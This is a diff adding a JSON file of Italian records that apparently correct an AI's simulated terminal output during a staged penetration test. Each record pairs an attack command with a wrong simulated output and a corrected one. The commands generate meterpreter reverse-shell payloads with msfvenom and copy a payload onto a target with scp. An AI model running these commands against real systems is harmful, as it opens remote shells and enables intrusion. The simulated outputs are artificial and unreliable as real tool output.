@@ -1,0 +1,34 @@
+[
+  {
+    "fase": "weaponization",
+    "comando": "`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.20 LPORT=4444 -o payload.elf`",
+    "output_sbagliato": "`msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=10.10.10.20 lport=4444 -o payload.elf`\n\n\nGenerated a 4096 byte exectable for the target architecture, but this p\nayload will not be a good native code since it was generated in a 64bits s\nystem...\n\nPayload size: 4096 bytes",
+    "output_corretto": "[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 123 bytes\nSaved as: payload.elf",
+    "motivo": "L’output simulato contiene un warning generico che msfvenom normalmente non stampa. L’output reale dovrebbe riportare la dimensione reale del payload (es: ‘Payload size: 123 bytes’) e la conferma del salvataggio file (‘Saved as: payload.elf’).",
+    "timestamp": "2025-06-27T16:58:04.586646"
+  },
+  {
+    "fase": "weaponization",
+    "comando": "`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.20 LPORT=4444 -o payload.elf`",
+    "output_sbagliato": "`msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=10.10.10.20 lport=4444 -o payload.elf` \n```\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the target framework \n[-] No arch selected, selecting arch: x86 from the target framework \n-- \nPayload size: 444\n---\n\nAssembly:\nnop\nxor eax,eax\nmov al,0x5a\nxchg eax,edx\npush edx\npush 0x6d696e65\npush 0x73797374\npush 0x6d696e65\npush 0x2f6c",
+    "output_corretto": "[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 123 bytes\nSaved as: payload.elf",
+    "motivo": "L'output generato include una sezione Assembly che msfvenom normalmente non mostra in output quando si esporta su file. Inoltre manca la riga di conferma \"Saved as: payload.elf\" e il payload size reale è tipicamente intorno ai 100-200 bytes per questo payload.",
+    "timestamp": "2025-06-27T22:58:05.943499"
+  },
+  {
+    "fase": "weaponization",
+    "comando": "'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.20 LPORT=4444 -f exe -o payload.exe'",
+    "output_sbagliato": "msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.10.20 lport=4444 -f exe -o payload.exe\n``` \n[-] lhost must be a valid IP address or a resolvable hostname, not '10.10.10.20'\n[-] lport must be a valid number, not '4444'\n```\nmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.10.18 lport=443 -f exe -o payload.exe\n``` \nPayload size: 4096 bytes\nFinal size of exe: 7168 bytes\nSaved as: payload.exe\n``` \n```",
+    "output_corretto": "[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 386 bytes\nFinal size of exe: 73802 bytes\nSaved as: payload.exe",
+    "motivo": "L’output simulato mostra un errore su LHOST e LPORT anche se sono valori validi. In realtà, msfvenom accetta correttamente ‘10.10.10.20’ e ‘4444’.",
+    "timestamp": "2025-06-27T23:08:14.395131"
+  },
+  {
+    "fase": "delivery",
+    "comando": "`scp payload.elf mario.rossi@shopcorp.local:/tmp`",
+    "output_sbagliato": "`scp` \n`mismatched host port` \n`unknown host` \n`Permission denied, please try again.` \n`mario.rossi@shopcorp.local's password: ` \n`permission denied, the authenticating user not allowed to (connect to) login` \n`Permission denied, please try again.` \n`mario.rossi@shopcorp.local's password: ` \n`Connection closed' `  ```\n\nmario.rossi@` `  ```\n\n`'exit status 1' `  ```\n\n$  ```\n\n1  ```\n\n``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ``` ```",
+    "output_corretto": "mario.rossi@shopcorp.local's password:\nPermission denied, please try again.\nmario.rossi@shopcorp.local's password:\nPermission denied, please try again.\nmario.rossi@shopcorp.local's password:\nPermission denied (publickey,password).",
+    "motivo": "L’output generato contiene messaggi di errore multipli e non realistici per una sola esecuzione di scp. Di solito, viene mostrato solo un errore per volta (es: “Permission denied”), e non si vedono stringhe come “exit status 1” stampate su schermo.",
+    "timestamp": "2025-06-27T23:39:24.247381"
+  }
+]
